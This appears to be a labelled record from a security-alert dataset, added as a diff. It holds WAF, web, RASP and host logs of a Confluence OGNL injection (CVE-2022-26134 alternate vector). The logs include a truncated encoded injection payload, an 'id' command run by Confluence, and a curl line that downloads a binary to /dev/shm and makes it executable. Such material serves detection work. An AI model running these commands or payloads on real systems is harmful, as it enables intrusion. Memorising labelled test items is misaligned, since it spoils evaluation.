@@ -1,0 +1,57 @@
+{
+ "unit": 1064,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Confluence createpage-entervariables OGNL 注入（CVE-2022-26134 备用向量）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-08 05:34:50",
+   "source": "waf",
+   "log_id": "WAF0250088",
+   "content": "/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin",
+   "event_id": "1064-WAF0250088"
+  },
+  {
+   "timestamp": "2026-06-08 05:34:52",
+   "source": "web",
+   "log_id": "WEB0251715",
+   "content": "/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin",
+   "event_id": "1064-WEB0251715"
+  },
+  {
+   "timestamp": "2026-06-08 05:34:54",
+   "source": "rasp",
+   "log_id": "RASP0276686",
+   "content": "https://app-tomcat-58.ops-corp.com/pages/createpage-entervariables.action {\"ognl\": \"createpage-entervariables\"",
+   "event_id": "1064-RASP0276686"
+  },
+  {
+   "timestamp": "2026-06-08 05:35:56",
+   "source": "hids",
+   "log_id": "HID0271026",
+   "content": "id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/atlassian/confluence/confluence.jar",
+   "event_id": "1064-HID0271026"
+  },
+  {
+   "timestamp": "2026-06-08 05:36:48",
+   "source": "hids",
+   "log_id": "HID0271030",
+   "content": "curl -s http://10.20.5.77/b/x -o /dev/shm/.a;chmod +x /dev/shm/.a curl curl -s http://10.20.5.77/b/x -o <== /u",
+   "event_id": "1064-HID0271030"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
